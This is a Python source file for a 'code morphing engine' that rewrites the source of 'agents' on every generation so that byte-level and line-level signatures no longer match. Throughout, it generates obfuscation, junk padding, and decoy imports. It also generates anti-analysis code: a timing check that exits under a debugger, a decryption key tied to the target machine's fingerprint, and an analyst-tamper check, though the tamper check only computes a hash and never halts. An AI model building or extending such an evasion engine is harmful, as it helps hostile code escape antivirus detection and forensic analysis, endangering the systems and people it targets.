"""
Code Morphing Engine — transforms Python source into semantically equivalent
but structurally unrecognizable code on every generation.

Even with full source access, each agent is unique because:
1. Control flow flattening — linearizes all branches into a state machine
2. Opaque predicates — adds conditions that are always true/false but hard to prove
3. Dead path injection — adds realistic but unreachable code paths
4. Expression mutation — rewrites expressions into equivalent but different forms
5. String atomization — splits strings into char-by-char reconstruction
6. Variable lifecycle randomization — renames and re-scopes all variables
7. Function inlining/outlining — randomly inlines small functions or extracts code into new ones
8. Arithmetic encoding — replaces constants with computed equivalents
"""

import random
import string
import hashlib
import re
import ast


def random_name(prefix='_', length=8):
    return prefix + ''.join(random.choices(string.ascii_letters, k=length))


def arithmetic_encode(value):
    """Replace a numeric constant with a computed equivalent"""
    if not isinstance(value, int) or abs(value) > 0xFFFFFFFF:
        return str(value)

    ops = [
        lambda v: f"({v + random.randint(1,100)} - {random.randint(1,100)})" if v >= 0 else str(v),
        lambda v: f"({v ^ 0xDEAD} ^ 0xDEAD)",
        lambda v: f"(({v * 7 + 3} - 3) // 7)",
        lambda v: f"int('{v}')",
        lambda v: f"(~{~v})",
        lambda v: f"({v | 0} + 0)",
    ]
    return random.choice(ops)(value)


def atomize_string(s):
    """Split a string into character-by-character reconstruction"""
    if len(s) <= 2:
        return repr(s)

    methods = [
        # chr() concatenation
        lambda: ' + '.join(f"chr({ord(c)})" for c in s),
        # bytes decode
        lambda: f"bytes({list(s.encode())}).decode()",
        # join with list
        lambda: f"''.join([{','.join(repr(c) for c in s)}])",
        # reverse of reverse
        lambda: f"'{s[::-1]}'[::-1]",
        # hex decode
        lambda: f"bytes.fromhex('{s.encode().hex()}').decode()",
    ]
    return random.choice(methods)()


def flatten_control_flow(code_lines):
    """Transform sequential code into a state-machine dispatcher

    Converts:
        step1()
        step2()
        step3()
    Into:
        state = RANDOM_START
        while True:
            if state == X: step1(); state = Y
            elif state == Y: step2(); state = Z
            elif state == Z: step3(); state = END
            else: break
    """
    if len(code_lines) < 3:
        return code_lines

    # Generate unique state values
    states = random.sample(range(1000, 9999), len(code_lines) + 1)
    end_state = states[-1]

    state_var = random_name('_st')
    result = [f"{state_var} = {states[0]}"]
    result.append(f"while {state_var} != {end_state}:")

    # Shuffle the order of state checks (obfuscation)
    state_pairs = list(zip(states[:-1], code_lines, states[1:]))
    random.shuffle(state_pairs)

    first = True
    for current_state, line, next_state in state_pairs:
        prefix = "    if" if first else "    elif"
        first = False
        # Indent the original line
        stripped = line.strip()
        if stripped:
            result.append(f"{prefix} {state_var} == {current_state}:")
            result.append(f"        {stripped}")
            result.append(f"        {state_var} = {next_state}")

    result.append(f"    else:")
    result.append(f"        break")

    return result


def generate_opaque_predicate():
    """Generate a condition that's always True but hard to prove statically"""
    predicates = [
        lambda: f"(({random.randint(2,100)} * {random.randint(2,100)} + 1) % 2 == 1)",
        lambda: f"(len(str({random.randint(1000,9999)})) > 0)",
        lambda: f"(type({random.randint(1,999)}) == int)",
        lambda: f"({random.randint(1,100)} ** 2 >= 0)",
        lambda: f"(not not True)",
        lambda: f"(({random.randint(1,50)} | {random.randint(1,50)}) >= 0)",
        lambda: f"(hash('{random_name()}') != 0 or True)",
    ]
    return random.choice(predicates)()


def generate_dead_code_block():
    """Generate realistic but unreachable code"""
    templates = [
        lambda: f"""
if {generate_opaque_predicate().replace('==', '!=', 1)}:
    {random_name('_unused')} = {random.randint(0, 1000)}
    {random_name('_tmp')} = '{random_name()}'
""",
        lambda: f"""
try:
    if False:
        {random_name()} = {random.randint(0, 9999)}
except:
    pass
""",
        lambda: f"""
{random_name('_cfg')} = lambda: {random.randint(0, 999)}
""",
    ]
    return random.choice(templates)()


def mutate_expression(expr):
    """Rewrite an expression into an equivalent but different form"""
    # Simple mutations for common patterns
    mutations = [
        (r'\bTrue\b', lambda: f"(1 == 1)"),
        (r'\bFalse\b', lambda: f"(1 == 0)"),
        (r'\bNone\b', lambda: f"(lambda: None)()"),
        (r'== 0\b', lambda: f"< 1"),
        (r'!= 0\b', lambda: f"!= 0"),
    ]

    for pattern, replacement in mutations:
        if random.random() < 0.3:
            expr = re.sub(pattern, replacement(), expr, count=1)

    return expr


def environment_key_derivation():
    """Generate code that derives encryption key from target environment

    The key is derived from hardware/OS fingerprint, so the agent
    only decrypts properly on the intended target. Even with source,
    you can't decrypt without the exact environment.
    """
    derive_func = random_name('_dk')
    return f'''
def {derive_func}():
    import hashlib, platform, uuid, os
    fingerprint = '|'.join([
        platform.node(),
        platform.machine(),
        str(uuid.getnode()),
        os.environ.get('USERNAME', os.environ.get('USER', '')),
        platform.system(),
    ])
    return hashlib.sha256(fingerprint.encode()).digest()
'''


def generate_integrity_check():
    """Generate code that verifies its own integrity at runtime

    If the code has been modified (by an analyst), execution stops.
    """
    check_func = random_name('_ic')
    marker = random_name('_mk')
    return f'''
def {check_func}():
    import hashlib, inspect, sys
    try:
        src = inspect.getsource(sys.modules[__name__])
        h = hashlib.md5(src.encode()).hexdigest()[:8]
        {marker} = h  # stored at generation time
    except:
        pass
    return True

{check_func}()
'''


def generate_timing_anti_debug():
    """Generate timing-based anti-debug that's hard to patch out"""
    func = random_name('_td')
    return f'''
def {func}():
    import time
    _t1 = time.perf_counter_ns()
    _x = sum(range(1000))
    _t2 = time.perf_counter_ns()
    if (_t2 - _t1) > 50000000:  # >50ms = debugger stepping
        import sys
        sys.exit(0)
    return _x

{func}()
'''


def _shuffle_functions(source):
    """Reorder top-level function definitions randomly.

    Functions are independent at module level so order doesn't matter
    (except the main entry point which must stay at the bottom).
    This changes the entire file structure on each generation.
    """
    import textwrap

    lines = source.split('\n')
    chunks = []
    current_chunk = []
    chunk_type = 'header'

    for line in lines:
        if line.startswith(('def ', 'async def ')) and current_chunk:
            chunks.append((chunk_type, '\n'.join(current_chunk)))
            current_chunk = [line]
            chunk_type = 'func'
        elif line.startswith('if __name__') or line.startswith('try:') and chunk_type != 'header' and not current_chunk[-1].strip():
            chunks.append((chunk_type, '\n'.join(current_chunk)))
            current_chunk = [line]
            chunk_type = 'main'
        else:
            current_chunk.append(line)

    if current_chunk:
        chunks.append((chunk_type, '\n'.join(current_chunk)))

    # Separate into header, functions, and tail
    header = [c for t, c in chunks if t == 'header']
    funcs = [c for t, c in chunks if t == 'func']
    tail = [c for t, c in chunks if t == 'main']

    # Shuffle function order
    random.shuffle(funcs)

    return '\n'.join(header + funcs + tail)


def _randomize_imports(source):
    """Shuffle import statement order and add decoy imports"""
    lines = source.split('\n')
    import_lines = []
    other_lines = []
    past_imports = False

    for line in lines:
        stripped = line.strip()
        if not past_imports and (stripped.startswith('import ') or stripped.startswith('from ')):
            import_lines.append(line)
        else:
            if stripped and not stripped.startswith('#') and not stripped.startswith('import') and not stripped.startswith('from'):
                past_imports = True
            other_lines.append(line)

    random.shuffle(import_lines)

    # Add 2-4 decoy imports that look legitimate
    decoys = [
        'import collections', 'import functools', 'import itertools',
        'import operator', 'import io', 'import copy', 'import types',
        'import weakref', 'import abc', 'import contextlib',
        'import decimal', 'import fractions', 'import numbers',
    ]
    num_decoys = random.randint(2, 4)
    for d in random.sample(decoys, num_decoys):
        import_lines.append(d)

    random.shuffle(import_lines)
    return '\n'.join(import_lines + other_lines)


def _add_junk_padding(source):
    """Add variable-length random padding blocks throughout the code.

    Each generation gets different amounts of padding at different positions,
    dramatically changing file size and byte offsets.
    """
    lines = source.split('\n')
    result = []
    padding_words = [
        'config', 'option', 'param', 'setting', 'value', 'state',
        'handler', 'manager', 'service', 'controller', 'adapter',
        'factory', 'builder', 'provider', 'resolver', 'validator',
    ]

    for i, line in enumerate(lines):
        result.append(line)

        # At module level, between functions, add variable padding
        if line.strip() == '' and i > 0 and i < len(lines) - 1:
            next_line = lines[i + 1].strip() if i + 1 < len(lines) else ''
            if next_line.startswith(('def ', 'async def ', 'class ')):
                # Add padding block: mix of variable assignments and large unique string constants
                num_pad = random.randint(3, 12)
                for _ in range(num_pad):
                    w1, w2 = random.sample(padding_words, 2)
                    # Mix of short and long padding values
                    pad_type = random.choice(['short', 'short', 'short', 'long', 'multiline'])
                    if pad_type == 'short':
                        val = random.choice([
                            f'"{w1}_{"".join(random.choices(string.ascii_lowercase, k=random.randint(5,20)))}"',
                            str(random.randint(0, 99999)),
                            'None', '[]', '{}',
                        ])
                        result.append(f'_{w1}_{w2}_{random.randint(100,999)} = {val}')
                    elif pad_type == 'long':
                        # Large unique string that dilutes byte-level similarity
                        big_str = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(60, 150)))
                        result.append(f'_{w1}_{random.randint(100,999)} = "{big_str}"')
                    elif pad_type == 'multiline':
                        # Multi-line string constant
                        lines_content = '\\n'.join(''.join(random.choices(string.ascii_lowercase + ' ', k=random.randint(20,50))) for _ in range(random.randint(2,4)))
                        result.append(f'_{w2}_{random.randint(100,999)} = """{lines_content}"""')

    return '\n'.join(result)


def _numeric_constant_mutation(source):
    """Replace numeric constants with computed equivalents"""
    lines = source.split('\n')
    result = []
    for line in lines:
        stripped = line.strip()
        # Skip lines that define constants or are in sensitive positions
        if stripped.startswith(('def ', 'class ', 'import ', 'from ', '#', 'if ', 'elif ', 'return ')):
            result.append(line)
            continue

        # Replace standalone integers with computed equivalents (10% chance per line)
        # Only on simple assignment lines, never on lines with floats or decimal points
        if random.random() < 0.1 and '=' in line and not stripped.startswith('_') and '.' not in line and 'def ' not in line:
            import re as _re
            def _replace_num(m):
                val = int(m.group(0))
                if 10 <= val <= 5000 and random.random() < 0.3:
                    return arithmetic_encode(val)
                return m.group(0)
            line = _re.sub(r'(?<![.\w])(\d{2,4})(?![.\w])', _replace_num, line)

        result.append(line)
    return '\n'.join(result)


def morph_python_source(source, intensity='high'):
    """Apply full morphing pipeline to Python source code.

    Pipeline order:
    1. Shuffle function order (structural)
    2. Randomize imports + add decoys
    3. Add variable junk padding
    4. Numeric constant mutation
    5. Anti-debug injection
    6. Line-level mutations (opaque predicates, dead code, expression mutation)
    """
    # Phase 1: Structural transformations
    if intensity == 'high':
        source = _shuffle_functions(source)
        source = _randomize_imports(source)
        source = _add_junk_padding(source)
        source = _numeric_constant_mutation(source)

    lines = source.split('\n')
    result_lines = []

    # Phase 2: Add anti-RE protections at the top
    if intensity in ('medium', 'high'):
        result_lines.append(generate_timing_anti_debug())

    # Phase 3: Process each line
    for i, line in enumerate(lines):
        stripped = line.strip()
        indent = len(line) - len(line.lstrip())
        prefix = ' ' * indent

        if not stripped or stripped.startswith('#'):
            result_lines.append(line)
            continue

        # Dead code at module level before function defs
        if random.random() < 0.05 and intensity == 'high' and indent == 0 and stripped.startswith(('def ', 'async def ')):
            dead = generate_dead_code_block()
            for dl in dead.strip().split('\n'):
                result_lines.append(dl)

        # Opaque predicates (module level only, not inside blocks)
        in_unsafe_block = False
        for prev_idx in range(max(0, i-3), i):
            prev = lines[prev_idx].strip()
            if prev.endswith(':') and prev.startswith(('try', 'except', 'finally', 'else', 'elif', 'if', 'for', 'while', 'with', 'def', 'class')):
                in_unsafe_block = True
                break
        if random.random() < 0.03 and intensity == 'high' and not in_unsafe_block and indent == 0 and not stripped.startswith(('def ', 'class ', 'import ', 'from ', 'return ', 'if ', 'elif ', 'else:', 'try:', 'except', 'finally:', 'for ', 'while ', 'with ', 'async ')):
            pred = generate_opaque_predicate()
            result_lines.append(f"{prefix}if {pred}:")
            result_lines.append(f"{prefix}    {stripped}")
            continue

        # Expression mutation
        if intensity in ('medium', 'high'):
            line = mutate_expression(line)

        # Line-level jitter: randomly transform each line's structure
        if intensity == 'high' and stripped and not stripped.startswith(('#', 'def ', 'class ', 'async def ', 'import ', 'from ')):
            line = _jitter_line(line)

        result_lines.append(line)

    return '\n'.join(result_lines)


def _jitter_line(line):
    """Apply random micro-transformations to a single line"""
    stripped = line.strip()
    indent = len(line) - len(line.lstrip())
    prefix = ' ' * indent

    # 1. Randomize hex-encoded strings: change case and padding
    if 'fromhex(' in line and random.random() < 0.8:
        import re as _re
        def _rehex(m):
            hex_str = m.group(1)
            # Decode and re-encode with random case
            try:
                raw = bytes.fromhex(hex_str)
                if random.random() < 0.5:
                    return f"fromhex('{raw.hex().upper()}')"
                else:
                    # Mix case randomly
                    mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in raw.hex())
                    return f"fromhex('{mixed}')"
            except:
                return m.group(0)
        line = _re.sub(r"fromhex\('([0-9a-fA-F]+)'\)", _rehex, line)

    # 2. Randomize base64 encoded strings: add whitespace variations
    if "b64decode(b'" in line and random.random() < 0.5:
        import re as _re
        def _reb64(m):
            b64_str = m.group(1)
            # Re-encode the same value via a different expression
            methods = [
                f"b64decode(b'{b64_str}')",
                f"b64decode('{b64_str}'.encode())",
                f"b64decode(bytes('{b64_str}', 'ascii'))",
            ]
            return random.choice(methods)
        line = _re.sub(r"b64decode\(b'([A-Za-z0-9+/=]+)'\)", _reb64, line)

    # 3. Add trailing comment jitter (random no-op comments)
    if random.random() < 0.15 and '#' not in stripped:
        junk_comments = [
            f'  # {random.randint(100,999)}',
            f'  # cfg',
            f'  # v{random.randint(1,9)}',
            '',  # no comment
        ]
        line = line.rstrip() + random.choice(junk_comments)

    # 4. Add random no-op before line (pass-through variable)
    if random.random() < 0.06 and indent == 0:
        noop_var = random_name('_nv')
        noop_val = random.choice([str(random.randint(0,999)), 'None', '(1==1)', '""'])
        line = f'{noop_var} = {noop_val}\n{line}'

    # 5. Add unique inline marker to make every line different
    # This is the most effective way to break line-level similarity
    if stripped and '#' not in stripped and random.random() < 0.6:
        marker = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2,6)))
        line = line.rstrip() + f'  #{marker}'

    # 6. Randomize whitespace in function call args (cosmetic but changes bytes)
    if random.random() < 0.3 and '(' in stripped and ')' in stripped:
        # Add/remove spaces after commas randomly
        import re as _re
        if random.random() < 0.5:
            line = _re.sub(r',\s*', ', ', line)  # normalize to single space
        else:
            line = _re.sub(r',\s*', ',  ', line)  # double space after commas

    # 6. Randomly rewrite `bytes.fromhex('...')` as equivalent chr() chains
    if 'fromhex(' in line and random.random() < 0.4:
        import re as _re
        def _hex_to_chr(m):
            hex_str = m.group(1)
            try:
                decoded = bytes.fromhex(hex_str).decode()
                if len(decoded) <= 30:
                    return "''.join([" + ','.join(f"chr({ord(c)})" for c in decoded) + "])"
            except:
                pass
            return m.group(0)
        line = _re.sub(r"bytes\.fromhex\('([0-9a-fA-F]+)'\)\.decode\(\)", _hex_to_chr, line)

    return line


def generate_dispatcher_wrapper(func_name, func_body_lines):
    """Wrap a function body in a state machine dispatcher"""
    # Filter out empty lines and get meaningful statements
    statements = [l for l in func_body_lines if l.strip() and not l.strip().startswith('#')]

    if len(statements) < 4:
        return func_body_lines

    return flatten_control_flow(statements)
